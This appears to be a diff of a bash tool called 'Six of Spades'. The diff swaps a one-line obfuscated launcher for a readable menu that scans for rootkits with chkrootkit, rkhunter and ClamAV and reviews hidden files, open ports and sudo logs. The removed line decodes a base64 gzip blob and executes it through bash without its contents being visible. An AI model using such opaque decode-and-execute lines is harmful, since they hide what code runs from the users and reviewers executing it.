@@ -1,1 +1,131 @@
-bash -c "$(echo H4sICGAKXGcAA1NpeF9vZl9TcGFkZXMAzVldbxo5FH3nV9yyVUgqDYTQplWjrhQlqZSHplWyqrTqrpAzY8BisEe2hyxq89/32p6ZDPMJlHTXLwSDz1wfn3vuNfntxeCe8cE9UbNO5+LP85sPvb+OR6Nvw7PR6aLXub26fJoY2om7qz+SqWN83/Fn1J+PJ0KOpRB6zrQ6PILvHcDxMGMhBS1jegaBsFNm+CElMntH/ZkAj0L35Xfz+Mfu+idd++d4b6MK/gc0jTv2D4gJ3EUkoKrxmwZqK/wLwx0gd3CbcLcb/v7o2S7+7Ucd/udIM8HV++fCH/bhNubgz+aJSkH5hO8P/6QP11xpEob5Z+wPf9SHr4w+5MFDMW2Vy8b4rx0/JFgS7tPAsqPgUM5nMddUAkr0IiSL869Hu+G/6cMdZr0/A7VSmi6s6GcsCCiHCbrEpjupwz/F+OnSMCQihIyExFwiPABO9YOQc/AF59S3ItsF/23Cv6Q+5SieOBAQKzKlG8bdhv/OxK9jyUELWBDGYUF5vCV4Lf7z+YMzblsU0LmzzyQlAXgRdK+selYilihdwXz6HkNyfz3VA6IovHSTwHg2b8bwaO2t/fpa+aiIxpYRVDNnfFrM+H6//xRuEYNNUCaLhZGNt8yvPPgdBgFdDngchmegZ5SX1pphVZFb9gM0pbmJsaQqDrXqY+pWArgjuzPOhIFEIdU0MMKwq0CRJWamFjWI/fKGaKho/YPSs7t8zMXMFHCBL87MzOO/IN+KpjOA35kwqXQDjxNWmnKC4DAET4EnrTa+YPAmSVcwpyuzL5llAFJsEwCPqwx/drY2dbKrRBLDXldJm0Be7EEiJNLelGqIo4BoCgcH69Mp094q94BKtJ8VbMZKN6+A9OgxKt/HI5ogyKriHOzqOoUVCDcq+0hY6ATMSqUyk5ltJ51hMOMd6N857zZ1KCL+3BgvbhtfZMNxmVGhxeas6K4nAwmNdFe5hPiv9T7aVe+mgBUs0fQQbYr/Bt6kxnLg7wZxhWa3G5rfpkZ1I0od0ETEPEi6F9fU/b/s6fWux3We78WwrXENcv22nHqTRjdr3A7xBDPtHtWtOnGrXIu34ZpRvmWJJHZfIlaWlvKK5n4g7TrHhcYg48s2CIVvFTuFdFR0DOlYt8uMoi3MMtt9RaeR4jXmU35Y08+i8DxrffVm2uS0hbhMqmTA5Yp+/VTKY2VC71XWnxSht8F+KnIqHYV8SEdF2U5HoayhKG0K7OmcnMi3O6UsBvSGwd6OKEm3nQ/IREWWz3M8FVWmZcWr+hWFfV/zJQlZkDhAaiNmn/nLz0YnVBELVcTfi8HnAml1+Te7ury7FZu9F2/Ejfu3epgwzJABbossELD/qgteqJJbh0MaO6TKkuvuGu5S3nTbKCJVkPGM5fN05wug/TnAENv+i0A71bgIc06Dp+OQJxQb3LHFbSC4ROf6ql9L5tufbR1LP3+0MzeVNILexedPn85vLj/0YLAkcoA7H5BYz2wTiWzizQC8k+OEWLNu7OC3IHZ91a8l9l2Z2DTKGmsrQ95jfOXyX3hQhcm2mGtyr9JyBWSKATSc10YEYdpoxmPaRktmw4HgtPNY9Y+Czr+z78+ifRgAAA== | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RED='\033[1;31m'
+RESET='\033[0m'
+
+check_for_rootkits() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________________________________________"
+        echo "    |                             Six of Spades                                |"
+        echo "    |                        Check for Rootkits                                |"
+        echo "    |__________________________________________________________________________|"
+        echo "    |                                                                          |"
+        echo "    |  Options:                                                                |"
+        echo "    |  1. Run chkrootkit scan                                                  |"
+        echo "    |  2. Install chkrootkit                                                   |"
+        echo "    |  3. View chkrootkit logs                                                 |"
+        echo "    |  4. Run advanced scans (rkhunter or ClamAV)                              |"
+        echo "    |  5. Search system for hidden files                                       |"
+        echo "    |  6. Review open ports and network connections                            |"
+        echo "    |  7. View recent sudo usage                                               |"
+        echo "    |  8. Return to main menu                                                  |"
+        echo "    |__________________________________________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Enter your choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Running chkrootkit scan...${RESET}"
+                if command -v chkrootkit &> /dev/null; then
+                    sudo chkrootkit | tee chkrootkit_results.log
+                    echo "Scan completed. Results saved to chkrootkit_results.log."
+                else
+                    echo -e "${RED}chkrootkit is not installed. Please install it first.${RESET}"
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Installing chkrootkit...${RESET}"
+                if ! command -v chkrootkit &> /dev/null; then
+                    sudo apt-get update && sudo apt-get install -y chkrootkit
+                    if command -v chkrootkit &> /dev/null; then
+                        echo "chkrootkit installed successfully."
+                    else
+                        echo -e "${RED}Failed to install chkrootkit. Please check your internet connection or package manager.${RESET}"
+                    fi
+                else
+                    echo "chkrootkit is already installed."
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Viewing chkrootkit logs...${RESET}"
+                if [ -f chkrootkit_results.log ]; then
+                    less chkrootkit_results.log
+                else
+                    echo -e "${RED}No chkrootkit logs found. Run a scan first.${RESET}"
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            4)
+                clear
+                echo -e "${CYAN}Advanced scan options:${RESET}"
+                echo "1. Run rkhunter (if installed)"
+                echo "2. Run ClamAV (if installed)"
+                echo "3. Return to previous menu"
+                read -p "Enter your choice: " advanced_choice
+                case $advanced_choice in
+                    1)
+                        if command -v rkhunter &> /dev/null; then
+                            echo -e "${CYAN}Running rkhunter...${RESET}"
+                            sudo rkhunter --check
+                        else
+                            echo -e "${RED}rkhunter is not installed. Install it using 'sudo apt-get install rkhunter'.${RESET}"
+                        fi
+                        ;;
+                    2)
+                        if command -v clamscan &> /dev/null; then
+                            echo -e "${CYAN}Running ClamAV...${RESET}"
+                            sudo clamscan -r /
+                        else
+                            echo -e "${RED}ClamAV is not installed. Install it using 'sudo apt-get install clamav'.${RESET}"
+                        fi
+                        ;;
+                    3)
+                        ;;
+                    *)
+                        echo -e "${RED}Invalid choice. Returning to main menu...${RESET}"
+                        ;;
+                esac
+                read -n 1 -s -r -p "Press any key to return to the main menu..."
+                ;;
+            5)
+                clear
+                echo -e "${CYAN}Searching for hidden files...${RESET}"
+                sudo find / -name ".*" -ls | tee hidden_files.log
+                echo "Search completed. Results saved to hidden_files.log."
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            6)
+                clear
+                echo -e "${CYAN}Reviewing open ports and network connections...${RESET}"
+                sudo netstat -tuln | tee open_ports.log
+                echo "Results saved to open_ports.log."
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            7)
+                clear
+                echo -e "${CYAN}Viewing recent sudo usage...${RESET}"
+                sudo grep 'COMMAND=' /var/log/auth.log | tail -20 | tee sudo_usage.log
+                echo "Results saved to sudo_usage.log."
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            8)
+                echo "Returning to main menu..."
+                break
+                ;;
+            *)
+                echo -e "${RED}Invalid choice. Please try again.${RESET}"
+                read -n 1 -s -r -p "Press any key to continue..."
+                ;;
+        esac
+    done
+}
+
+check_for_rootkits
